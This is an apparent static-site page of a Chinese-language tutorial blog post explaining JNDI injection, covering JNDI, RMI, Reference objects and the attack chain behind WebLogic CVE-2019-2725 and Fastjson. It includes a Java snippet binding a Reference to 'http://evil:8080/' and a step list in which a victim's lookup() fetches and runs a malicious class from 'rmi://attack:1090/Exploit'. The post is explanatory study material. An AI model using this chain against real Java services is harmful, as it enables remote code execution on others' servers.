@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="最新的Weblogic cve-2019-2725与Fastjson JdbcRowSetImpl利用链都用到了JNDI注入，学习一波   JNDI介绍 JNDI即Java Naming and Directory Interface，就是一组在Java应用中访问命名与服务的API。为开发人员查找和访问资源提供了统一的通用接口，可以用来定位网络 机器 用户 对象等各种资源。JNDI底层提供了很多">
+<meta name="keywords" content="Java安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入入门">
+<meta property="og:url" content="http://yoursite.com/2019/05/05/JNDI注入入门/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="最新的Weblogic cve-2019-2725与Fastjson JdbcRowSetImpl利用链都用到了JNDI注入，学习一波   JNDI介绍 JNDI即Java Naming and Directory Interface，就是一组在Java应用中访问命名与服务的API。为开发人员查找和访问资源提供了统一的通用接口，可以用来定位网络 机器 用户 对象等各种资源。JNDI底层提供了很多">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-10.22.07.33-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-15.13.44.39-image.png">
+<meta property="og:updated_time" content="2019-05-23T14:25:10.274Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JNDI注入入门">
+<meta name="twitter:description" content="最新的Weblogic cve-2019-2725与Fastjson JdbcRowSetImpl利用链都用到了JNDI注入，学习一波   JNDI介绍 JNDI即Java Naming and Directory Interface，就是一组在Java应用中访问命名与服务的API。为开发人员查找和访问资源提供了统一的通用接口，可以用来定位网络 机器 用户 对象等各种资源。JNDI底层提供了很多">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-10.22.07.33-image.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="../../../../images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="../../../../images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="../../../../images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>JNDI注入入门</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="../../../../css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="../../10/XMLDecoder.readObject()解析流程分析/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="../../03/Weblogic-CVE-2019-2725分析/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/05/JNDI注入入门/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/05/JNDI注入入门/&text=JNDI注入入门"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/05/JNDI注入入门/&is_video=false&description=JNDI注入入门"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JNDI注入入门&body=Check out this article: http://yoursite.com/2019/05/05/JNDI注入入门/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/05/JNDI注入入门/&name=JNDI注入入门&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI介绍"><span class="toc-number">1.</span> <span class="toc-text">JNDI介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI协议动态转换"><span class="toc-number">1.0.1.</span> <span class="toc-text">JNDI协议动态转换</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI介绍"><span class="toc-number">2.</span> <span class="toc-text">RMI介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI注入"><span class="toc-number">2.0.1.</span> <span class="toc-text">JNDI注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        JNDI注入入门
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">P0rZ9's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-05-05T00:15:41.000Z" itemprop="datePublished">2019-05-05</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="../../../../tags/Java安全/">Java安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>最新的Weblogic cve-2019-2725与Fastjson JdbcRowSetImpl利用链都用到了JNDI注入，学习一波</p>
+</blockquote>
+<hr>
+<h2 id="JNDI介绍"><a href="#JNDI介绍" class="headerlink" title="JNDI介绍"></a>JNDI介绍</h2><blockquote>
+<p>JNDI即Java Naming and Directory Interface，就是一组在Java应用中访问命名与服务的API。为开发人员查找和访问资源提供了统一的通用接口，可以用来定位网络 机器 用户 对象等各种资源。JNDI底层提供了很多实现方式，有RMI LDAP CORBA等，这些服务器注册的服务可以通过JNDI提供的一个统一外部接口去访问调用。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-10.22.07.33-image.png" alt="2019-05-10.22.07.33-image.png"></p>
+<p><strong>Java Naming</strong></p>
+<blockquote>
+<p>键值对的绑定，应用程序可通过键检索值            </p>
+</blockquote>
+<p><strong>Java Directory</strong></p>
+<blockquote>
+<p>是对Java Naming的补充扩张。差别为Java Directory可以根据属性搜索对象。在目录服务中，JNDI允许访问文件系统中的文件，绑定在RMI服务器的对象，LDAP服务与其他组件。        </p>
+</blockquote>
+<p>JNDI将名字与对象绑定，可以通过名字检索存储在RMI LDAP服务器上的对象，所以提供了绑定与检索方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void bind(String name,Object obj) //将对象绑定到name上			</span><br><span class="line">Object lookup(String name) //通过名字检索Object对象</span><br></pre></td></tr></table></figure></p>
+<p><strong>Jndi Naming Reference</strong>            </p>
+<blockquote>
+<p>对象可以通过绑定Reference存储在Naming与Directory服务下(RMI LDAP等)，在使用reference时，我们可以直接将恶意代码写在构造方法中，当被调用时，执行我们的恶意代码</p>
+</blockquote>
+<p>如果远程获取RMI服务器上的对象为Reference类或者其子类时，可以从其他服务器上加载class文件来进行实例化。            </p>
+<p>Reference对象属性：                        </p>
+<ul>
+<li>className:加载使用类名        </li>
+<li>classFactory:加载的class需要实例化的类名</li>
+<li>classFactoryLocation:class文件的地址(支持ftp http file协议)            </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reference reference = new Reference(&quot;Class1&quot;,&quot;Class2&quot;,&quot;http://evil:8080/&quot; );			</span><br><span class="line">registry.bind(&quot;evil&quot;, new ReferenceWrapper(reference));</span><br></pre></td></tr></table></figure>
+<p>当客户端通过<code>lookup(&quot;evil&quot;)</code>获取远程对象时，由于获取的是Reference实例，客户端首先去本地查找Class1类，如果本地未找到，就回去请求<code>http://evil:8080/Class2.class</code>去获取并调用<code>Class2</code>的构造函数            </p>
+<h4 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h4><blockquote>
+<p>简单说就是调用lookup()或者search()时，可以使用URL 动态转化上下文环境。在初始化时已经指定了RMI环境，但是在调用lookup()时，可以直接使用ldap协议改变上下文协议，使其可以访问LDAP服务上的对象                </p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-15.13.44.39-image.png" alt="2019-05-15.13.44.39-image.png"></p>
+<h2 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h2><p>RMI的核心特点:动态加载类            </p>
+<blockquote>
+<p>当前JVM中无这个对象，就会去指定的url去下载。当客户端访问某个对象时，由于本地并没有这个对象，那么就会去访问服务器返回的url地址，由客户端自己去访问下载并解析执行            </p>
+</blockquote>
+<blockquote>
+<p>JNDI与RMI的关系可以理解为，JNDI获取RMI服务器绑定的对象，或者远程对象。在漏洞利用当中，一般都是通过JNDI获取RMI服务器提供的远程对象。   <a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jndi/jndi-rmi.html" target="_blank" rel="noopener">官方文档</a></p>
+</blockquote>
+<h4 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h4><p>JNDI注入的几个条件            </p>
+<blockquote>
+<p>1.lookup()方法的参数可控<br>2.允许使用带协议的url进行动态协议转换<br>3.Reference类动态代码获取实例化            </p>
+</blockquote>
+<p>攻击流程:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.攻击者通过可控url触发动态协议转换(rmi://attack:1090/Exploit)</span><br><span class="line">2.受害者服务器原上下文环境被转换为rmi://attack:1090/Exploit</span><br><span class="line">3.受害者服务器去rmi://attack:1090/Exploit请求绑定对象Exploit，攻击者实现准备好的RMI服务器返回一个ReferenceWrapper对象(Reference(&quot;Class1&quot;,&quot;Class2&quot;,&quot;http://evil:8080/&quot;))		</span><br><span class="line">4.应用获取到ReferenceWrapper开始在本地查找Class1，发现无，则去请求http://evil:8080/Class2.class</span><br><span class="line">5.web服务器返回事先准备好的恶意class文件，受害者服务器调用Class2的构造方法，恶意代码执行</span><br></pre></td></tr></table></figure></p>
+<p>在Fastjson中，漏洞利用与反序列化联系不是很大，就是在对Gadget类中属性进行反序列化时调用了危险函数lookup()，且参数可控，利用JNDI注入完成攻击            </p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.tuisec.win/detail/dc4561a322b87f4" target="_blank" rel="noopener">https://paper.tuisec.win/detail/dc4561a322b87f4</a><br><a href="https://laworigin.github.io/2019/03/23/Spring-Deserialize-RCE-JNDI-Inject/" target="_blank" rel="noopener">https://laworigin.github.io/2019/03/23/Spring-Deserialize-RCE-JNDI-Inject/</a></p>
+<p><a href="http://www.nsoad.com/Article/web/20161011/525.html" target="_blank" rel="noopener">http://www.nsoad.com/Article/web/20161011/525.html</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="../../../../index.html">Home</a></li>
+         
+          <li><a href="../../../../about.html">About</a></li>
+         
+          <li><a href="../../../../archives/">Writing</a></li>
+         
+          <li><a href="../../../../friends.html">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI介绍"><span class="toc-number">1.</span> <span class="toc-text">JNDI介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI协议动态转换"><span class="toc-number">1.0.1.</span> <span class="toc-text">JNDI协议动态转换</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI介绍"><span class="toc-number">2.</span> <span class="toc-text">RMI介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI注入"><span class="toc-number">2.0.1.</span> <span class="toc-text">JNDI注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/05/JNDI注入入门/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/05/JNDI注入入门/&text=JNDI注入入门"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/05/JNDI注入入门/&is_video=false&description=JNDI注入入门"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JNDI注入入门&body=Check out this article: http://yoursite.com/2019/05/05/JNDI注入入门/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/05/JNDI注入入门/&title=JNDI注入入门"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/05/JNDI注入入门/&name=JNDI注入入门&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2019 P0rZ9
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="../../../../lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="../../../../lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="../../../../lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="../../../../lib/jquery/jquery.min.js"></script>
+<script src="../../../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="../../../../js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
